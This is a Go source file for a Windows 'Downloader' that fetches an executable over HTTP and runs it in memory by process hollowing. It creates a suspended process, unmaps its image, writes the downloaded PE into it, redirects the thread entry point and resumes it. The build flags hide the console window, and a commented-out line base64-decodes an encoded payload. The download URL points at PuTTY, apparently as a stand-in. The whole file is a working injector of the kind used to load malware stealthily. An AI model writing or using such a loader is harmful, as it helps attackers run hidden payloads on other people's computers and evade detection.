//If this is compiled in 64bit the Payload MUST be 64bit!
//go build -o Downloader.exe -ldflags "-H windowsgui" "C:\main.go"
package main

import (
	"bytes"
	"debug/pe"
	"encoding/base64"
	"encoding/binary"
	"net/http"
	"os"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	CreateSuspended                    = 0x00000004
	MemCommit                          = 0x1000
	MemReserve                         = 0x2000
	PageExecuteReadwrite               = 0x40
	ImageRelBasedDir64   ImageRelBased = 10
)

var (
	kernel32               = windows.NewLazySystemDLL("kernel32.dll")
	procGetThreadContext   = kernel32.NewProc("GetThreadContext")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procResumeThread       = kernel32.NewProc("ResumeThread")
	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procSetThreadContext   = kernel32.NewProc("SetThreadContext")
	procReadProcessMemory  = kernel32.NewProc("ReadProcessMemory")
	procGetModuleFileNameA = kernel32.NewProc("GetModuleFileNameA")

	ntdll                    = windows.NewLazySystemDLL("ntdll.dll")
	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
)

type ImageRelBased uint16
type baseRelocEntry uint16

func main() {
	resp, _ := http.Get("https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe")
	//resp, _ := http.Get("http://localhost/test.file")
	buf := new(bytes.Buffer)
	buf.ReadFrom(resp.Body)
	ReflectiveInjection(buf.Bytes())
	//ReflectiveInjection([]byte(Base64Decode(string(buf.Bytes()))))
}

func ReflectiveInjection(destPE []byte) {
	var handle syscall.Handle = 0
	var buf []byte
	size := uint32(1024)
	buf = make([]byte, size)
	procGetModuleFileNameA.Call(uintptr(handle), uintptr(unsafe.Pointer(&buf[0])), uintptr(size))
	buf = bytes.Trim(buf, "\x00")
	pathC := string(buf)
	cmd := windows.StringToUTF16Ptr(pathC)
	si := new(syscall.StartupInfo)
	pi := new(syscall.ProcessInformation)
	err2 := syscall.CreateProcess(cmd, nil, nil, nil, false, CreateSuspended, nil, nil, si, pi) // replace this ?
	if err2 != nil {
		panic(err2)
	}
	hProcess := uintptr(pi.Process)
	hThread := uintptr(pi.Thread)
	ctx, err := GetThreadContext(hThread)
	if err != nil {
		os.Exit(1)
	}
	Rdx := binary.LittleEndian.Uint64(ctx[136:])
	baseAddr, err := ReadProcessMemoryAsAddr(hProcess, uintptr(Rdx+16))
	if err != nil {
		os.Exit(1)
	}
	destPEReader := bytes.NewReader(destPE)
	f, err := pe.NewFile(destPEReader)
	oh, ok := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		os.Exit(1)
	}
	if err := NtUnmapViewOfSection(hProcess, baseAddr); err != nil {
		os.Exit(1)
	}
	newImageBase, err := VirtualAllocEx(hProcess, baseAddr, oh.SizeOfImage, MemReserve|MemCommit, PageExecuteReadwrite)
	if err != nil {
		os.Exit(1)
	}
	err = WriteProcessMemory(hProcess, newImageBase, destPE, oh.SizeOfHeaders)
	if err != nil {
		os.Exit(1)
	}
	for _, sec := range f.Sections {
		secData, err := sec.Data()
		if err != nil {
			os.Exit(1)
		}
		err = WriteProcessMemory(hProcess, newImageBase+uintptr(sec.VirtualAddress), secData, sec.Size)
		if err != nil {
			os.Exit(1)
		}
	}
	delta := int64(oh.ImageBase) - int64(newImageBase)
	if delta != 0 && false {
		rel := oh.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_BASERELOC]
		relSec := findRelocSec(rel.VirtualAddress, f.Sections)
		if relSec == nil {
			os.Exit(1)
		}
		var read uint32
		d, err := relSec.Data()
		if err != nil {
			os.Exit(1)
		}
		rr := bytes.NewReader(d)
		for read < rel.Size {
			dd := new(pe.DataDirectory)
			binary.Read(rr, binary.LittleEndian, dd)
			read += 8
			reSize := (dd.Size - 8) / 2
			re := make([]baseRelocEntry, reSize)
			read += reSize * 2
			binary.Read(rr, binary.LittleEndian, re)
			for _, rrr := range re {
				if rrr.Type() == ImageRelBasedDir64 {
					rell := newImageBase + uintptr(rrr.Offset()) + uintptr(dd.VirtualAddress)
					raddr, err := ReadProcessMemoryAsAddr(hProcess, rell)
					if err != nil {
						os.Exit(1)
					}
					err = WriteProcessMemoryAsAddr(hProcess, rell, uintptr(int64(raddr)+delta))
					if err != nil {
						os.Exit(1)
					}
				} else {
				}
			}
		}
	}
	addrB := make([]byte, 8)
	binary.LittleEndian.PutUint64(addrB, uint64(newImageBase))
	err = WriteProcessMemory(hProcess, uintptr(Rdx+16), addrB, 8)
	if err != nil {
		os.Exit(1)
	}
	binary.LittleEndian.PutUint64(ctx[128:], uint64(newImageBase)+uint64(oh.AddressOfEntryPoint))
	err = SetThreadContext(hThread, ctx)
	if err != nil {
		os.Exit(1)
	}
	_, err = ResumeThread(hThread)
	if err != nil {
		os.Exit(1)
	}
}

func ResumeThread(hThread uintptr) (count int32, e error) {
	ret, _, err := procResumeThread.Call(hThread)
	if ret == 0xffffffff {
		e = err
	}
	count = int32(ret)
	return
}

func VirtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uint32, flAllocationType int, flProtect int) (addr uintptr, e error) {
	ret, _, err := procVirtualAllocEx.Call(
		hProcess,
		lpAddress,
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if ret == 0 {
		e = err
	}
	addr = ret
	return
}

func ReadProcessMemory(hProcess uintptr, lpBaseAddress uintptr, size uint32) (data []byte, e error) {
	var numBytesRead uintptr
	data = make([]byte, size)
	r, _, err := procReadProcessMemory.Call(hProcess,
		lpBaseAddress,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)))
	if r == 0 {
		e = err
	}
	return
}

func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, data []byte, size uint32) (e error) {
	var numBytesRead uintptr
	r, _, err := procWriteProcessMemory.Call(hProcess,
		lpBaseAddress,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)))
	if r == 0 {
		e = err
	}
	return
}

func GetThreadContext(hThread uintptr) (ctx []uint8, e error) {
	ctx = make([]uint8, 1232)
	binary.LittleEndian.PutUint32(ctx[48:], 0x00100000|0x00000002)
	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := procGetThreadContext.Call(hThread, uintptr(ctxPtr))
	if r == 0 {
		e = err
	}
	return ctx, nil
}

func ReadProcessMemoryAsAddr(hProcess uintptr, lpBaseAddress uintptr) (val uintptr, e error) {
	data, err := ReadProcessMemory(hProcess, lpBaseAddress, 8)
	if err != nil {
		e = err
	}
	val = uintptr(binary.LittleEndian.Uint64(data))
	return
}

func WriteProcessMemoryAsAddr(hProcess uintptr, lpBaseAddress uintptr, val uintptr) (e error) {
	buf := make([]byte, 8)
	binary.LittleEndian.PutUint64(buf, uint64(val))
	err := WriteProcessMemory(hProcess, lpBaseAddress, buf, 8)
	if err != nil {
		e = err
	}
	return
}

func NtUnmapViewOfSection(hProcess uintptr, baseAddr uintptr) (e error) {
	r, _, err := procNtUnmapViewOfSection.Call(hProcess, baseAddr)
	if r != 0 {
		e = err
	}
	return
}

func SetThreadContext(hThread uintptr, ctx []uint8) (e error) {
	ctxPtr := unsafe.Pointer(&ctx[0])
	r, _, err := procSetThreadContext.Call(hThread, uintptr(ctxPtr))
	if r == 0 {
		e = err
	}
	return
}

func (b baseRelocEntry) Type() ImageRelBased {
	return ImageRelBased(uint16(b) >> 12)
}

func (b baseRelocEntry) Offset() uint32 {
	return uint32(uint16(b) & 0x0FFF)
}

func findRelocSec(va uint32, secs []*pe.Section) *pe.Section {
	for _, sec := range secs {
		if sec.VirtualAddress == va {
			return sec
		}
	}
	return nil
}

func Base64Decode(str string) string {
	data, err := base64.StdEncoding.DecodeString(str)
	if err != nil {
		return ""
	}
	return string(data)
}
